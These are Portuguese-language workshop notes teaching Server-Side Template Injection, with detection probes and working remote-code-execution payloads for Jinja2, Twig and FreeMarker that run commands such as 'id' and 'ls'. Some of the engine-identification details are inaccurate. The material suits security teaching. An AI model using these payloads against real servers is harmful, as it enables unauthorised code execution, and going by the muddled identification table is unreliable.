# RSI Worksho

## O que é SSTI

SSTI ou Server-Side template Injection é um tipo de ataque, geralmente explorado no campo WEB, em que o atacante consegue utilizar sintaxes nativas de uma motor/linguagem para injetar códigos ou execuções maliciosas em um template ( geralmente bibliotecas ou frameworks generativos ) que são executados no campo do servidor como se fosse um código genuíno da aplicação

Essa vulnerabilidade costuma ocorrer por um descuido de design de aplicação, onde o desenvolvedor esquece de tratar corretamente um dado que é passado por meio da entrada do usuário e utilizado pelo template para processar/gerar novas páginas. Com isso, sem o condicionamento correto do dado, o template concatena o input diretamente na estrutura do template o que, geralmente, é crítico por levar à Execução Remota de Código ( RCE )

## Como Explorar ?

Como dito anteriormente, essa vulnerabilidade costuma ocorrer quando a aplicação usa de frameworks de geração dinâmica de páginas utilizando inputs não sanitizdos de usuários.

Os frameworks generativos mais comums são
- Jinja2 ( Python/Flask/Django )
- Twig ( PHP/Symfony )
- FreeMarker ( Java )

Sabendo disso, costumamos seguir alguns passos

1. Detectar
  Injetar `${7*7}`, `{{7*7}}` ou `<%= 7*7 %>`. Se a página renderizar 49, a vulnerabilidade existe.
2. Identificar os motores
  Diferentes motores usam sintaxes parecidas. Usa-se uma árvore de decisão para descobrir a tecnologia exata.
  - `${7*'7'}` gera 49 no Twig
  - `${{7*'7'}}` gera 7777777 no Jinja2
  - `<%= 7*7 %>` gera 49 no FreeMaker
  - Etc
3. Explorar as vulnerabilidade
  Aqui, confirmamos a existência de vulnerabilidade e, principalmente, o possível motor utilizado pela aplicação. Com isso, devemos usar os conhecimentos de programação e utilizar métodos nativos, acessando objetos do sistema e criando um caminho para execução de comandos, leitura de arquivos, exploração de diretórios e, assim, fazendo o **RCE**.
  

### Jinja2

O payload mais comum para esse tipo de framework é `{{7*'7'}}` que costuma gerar 7777777. Essa execução, costumeiramente, confirma a presença da vulnerabilidade ssti.

Com isso, temos um payload muito comum para a Execução de Comando ( RCE )
```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```
ou 
```
self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()
```

Onde podemos injetar comandos ( geralmente Linux ) dentro da função popen() e explorando códigos nativos do Python como self,__init__,__globals__,__import__,os,subprecess, etc;

### Twig (PHP / Symfony)

Um dos motores de template mais famosos do PHP. Ataques em versões mais antigas permitiam mapear filtros não definidos para funções perigosas do PHP.

- Payload básico: `{{ 7*7 }}`

- Exemplo de Execução de Comando (RCE):
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### FreeMaker ( Java )

Muito utilizado em aplicações corporativas (como Spring Boot). A exploração envolve a capacidade do FreeMarker de instanciar classes nativas de utilidade para executar comandos.

- Payload básico: `${7*7}`

- Exemplo de Execução de Comando (RCE):
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```
